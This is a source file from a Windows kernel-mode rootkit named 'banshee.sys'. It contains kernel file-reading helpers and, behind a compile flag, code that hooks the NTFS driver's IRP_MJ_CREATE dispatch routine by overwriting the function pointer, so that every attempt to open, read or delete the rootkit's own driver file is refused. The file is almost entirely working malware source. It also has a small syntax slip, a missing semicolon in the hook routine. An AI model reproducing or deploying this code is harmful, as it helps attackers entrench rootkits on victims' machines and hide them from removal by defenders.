#pragma once

#include <ntifs.h>
#include <wdf.h>
#include <ntddk.h>
#include <ntstrsafe.h>
#include <ntdef.h>
#include "Globals.hpp"
#include "WinTypes.hpp"

/**
 * Finds the filename from the given full path.
 *
 * @param[in] FullPath Pointer to a wide character string representing the full path.
 * @return Pointer to the character following the last backslash in the path if found,
 *         otherwise returns the original pointer (assuming fullPath points to the filename).
 */
PWCH
BeGetFilenameFromPath(_In_ PWCH FullPath)
{
    //
    // Find the last occurrence of backslash in the full path
    //
    PWCH LastSlash = nullptr;
    PWCH current   = FullPath;
    while (*current != L'\0')
    {
        if (*current == L'\\')
        {
            LastSlash = current;
        }
        current++;
    }

    //
    // If a backslash is found, return the pointer to the character after the backslash
    //
    if (LastSlash != nullptr)
    {
        return LastSlash + 1;
    }
    else
    {
        //
        // Otherwise, return the original pointer (assuming fullPath points to the filename itself)
        //
        return FullPath;
    }
}

/**
 * Retrieves the driver object of the NTFS driver.
 *
 * @param[out] NtfsDriverObject Pointer to a variable to receive the pointer to the NTFS driver object.
 * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
 */
NTSTATUS
BeGetNtfsDriverObject(_Out_ PDRIVER_OBJECT* NtfsDriverObject)
{
    UNICODE_STRING    NtfsDriverName = RTL_CONSTANT_STRING(L"\\FileSystem\\NTFS");
    OBJECT_ATTRIBUTES ObjAttr        = { 0 };

    InitializeObjectAttributes(&ObjAttr, &NtfsDriverName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    //
    // Get a pointer to the driver object representing the NTFS driver
    //
    NTSTATUS Status = BeGlobals::pObReferenceObjectByName(&NtfsDriverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID)NtfsDriverObject);
    if (!NT_SUCCESS(Status))
        return Status;

    return STATUS_SUCCESS;
}

/**
 * @brief Reads the contents of a file into a dynamically allocated buffer.
 *
 * @param[in]  FilePath  A pointer to a null-terminated wide string containing
 *                       the full path to the file.
 * @param[out] OutBuffer A pointer to a memory location that will receive
 *                       the allocated buffer containing the file data.
 * @param[out] Outsize   A pointer to a variable that will receive the size
 *                       of the allocated buffer.
 *
 * @return STATUS_SUCCESS if the file was successfully read.
 *         An appropriate NTSTATUS error code if the operation fails.
 */
NTSTATUS
BeReadFile(
    _In_  PCWSTR  FilePath,
    _Out_ PVOID*  OutBuffer,
    _Out_ PSIZE_T Outsize
) {
    HANDLE                    HFile      = NULL;
    OBJECT_ATTRIBUTES         ObjAttr    = { 0 };
    IO_STATUS_BLOCK           IoStatus   = { 0 };
    UNICODE_STRING            Path       = { 0 };
    FILE_STANDARD_INFORMATION FileInfo   = { 0 };
    LARGE_INTEGER             ByteOffset = { 0 };

    WCHAR NtPath[256 + 10];
    RtlZeroMemory(NtPath, sizeof(NtPath));

    //
    // Construct the full NT path by prefixing "\??\"
    //
    NTSTATUS Status = RtlStringCchCopyW(NtPath, ARRAYSIZE(NtPath), L"\\??\\");
    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("RtlStringCchCopyW Failed With Status: %d\n", Status);
        return Status;
    }

    //
    // Append the provided file path to the NT path
    //
    Status = RtlStringCchCatW(NtPath, ARRAYSIZE(NtPath), FilePath);
    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("RtlStringCchCatW Failed With Status: %d\n", Status);
        return Status;
    }

    LOG_MSG("File NT: %ws\n", NtPath);

    //
    // Initialize the UNICODE_STRING and OBJECT_ATTRIBUTES for the file
    //
    RtlInitUnicodeString(&Path, NtPath);
    InitializeObjectAttributes(&ObjAttr, &Path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    //
    // Open the file with read access
    //
    Status = ZwCreateFile(
        &HFile,
        GENERIC_READ | SYNCHRONIZE,
        &ObjAttr,
        &IoStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("ZwCreateFile Failed With Status: %d\n", Status);
        return Status;
    }

    //
    // Query the file size
    //
    Status = ZwQueryInformationFile(
        HFile,
        &IoStatus,
        &FileInfo,
        sizeof(FILE_STANDARD_INFORMATION),
        FileStandardInformation
    );

    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("ZwQueryInformationFile Failed With Status: %d\n", Status);
        return Status;
    }

    //
    // Allocate a buffer to store the file contents
    //
    SIZE_T Size = FileInfo.EndOfFile.QuadPart;
    *OutBuffer  = ExAllocatePool2(POOL_FLAG_NON_PAGED, Size, DRIVER_TAG);
    *Outsize    = Size;

    //
    // Read the file into the allocated buffer
    //
    Status = ZwReadFile(
        HFile,
        NULL,
        NULL,
        NULL,
        &IoStatus,
        *OutBuffer,
        static_cast<ULONG>(Size),
        &ByteOffset,
        NULL
    );

    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("ZwReadFile Failed With Status: %d\n", Status);
        return Status;
    }

    return Status;
}

#if DENY_DRIVER_FILE_ACCESS
/**
 * Hooked IRP_MJ_CREATE handler for the NTFS driver.
 * Denies access to the file if the filename matches the rootkit driver filename "banshee.sys",
 * otherwise calls the original NTFS IRP_MJ_CREATE handler.
 *
 * @param DeviceObject Pointer to the target device object.
 * @param Irp Pointer to the I/O Request Packet (IRP).
 * @return STATUS_ACCESS_DENIED if access to the file is denied, otherwise returns the result of the original function.
 */
NTSTATUS
BeHooked_NTFS_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);

    // Get filename of file that will be accessed
    PWCH fullPath = pIoStackIrp->FileObject->FileName.Buffer;

    // If the file that will be accessed is our rootkit driver, deny access to the file
    // This doesnt hide the file, but protects it from deletion or read access
    UNICODE_STRING driverName = RTL_CONSTANT_STRING(L"banshee.sys")
        if (!BeIsStringNull(fullPath) &&
            (RtlCompareUnicodeString(BeGetFilenameFromPath(fullPath), &driverName, TRUE) == 0))
        {
            LOG_MSG("Filename: %ws\n", fullPath);
            Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
            return STATUS_SUCCESS;
        }

    // else call the original function
    return BeGlobals::OriginalNTFS_IRP_MJ_CREATE_function(DeviceObject, Irp);
}

/**
 * Hooks the IRP_MJ_CREATE function of the NTFS driver.
 *
 * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
 */
NTSTATUS
BeHookNTFSFileCreate()
{
    PDRIVER_OBJECT ntfsDriverObject;
    NTSTATUS NtStatus = BeGetNtfsDriverObject(&ntfsDriverObject);

    if (NtStatus != 0)
    {
        LOG_MSG("Failed to get ntfs driver object, (0x%08X)\n", NtStatus);
        return NtStatus;
    }

    // Get the MJ_CREATE function of the ntfs driver and save it to the global variable
    // Also put our function as the IRP_MJ_CREATE handler instead
    BeGlobals::OriginalNTFS_IRP_MJ_CREATE_function = (NTFS_IRP_MJ_CREATE_FUNCTION)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeHooked_NTFS_IRP_MJ_CREATE);

    ObDereferenceObject(ntfsDriverObject);
    return STATUS_SUCCESS;
}

/**
 * Unhooks the IRP_MJ_CREATE function of the NTFS driver.
 *
 * @return STATUS_SUCCESS if successful, otherwise returns an appropriate NTSTATUS error code.
 */
NTSTATUS
BeUnhookNTFSFileCreate()
{
    PDRIVER_OBJECT ntfsDriverObject;
    NTSTATUS NtStatus = BeGetNtfsDriverObject(&ntfsDriverObject);

    if (NtStatus != 0)
    {
        LOG_MSG("Failed to get ntfs driver object, (0x%08X)\n", NtStatus);
        return NtStatus;
    }

    // Restore the original address
    InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)BeGlobals::OriginalNTFS_IRP_MJ_CREATE_function);

    ObDereferenceObject(ntfsDriverObject);
    return STATUS_SUCCESS;
}
#endif 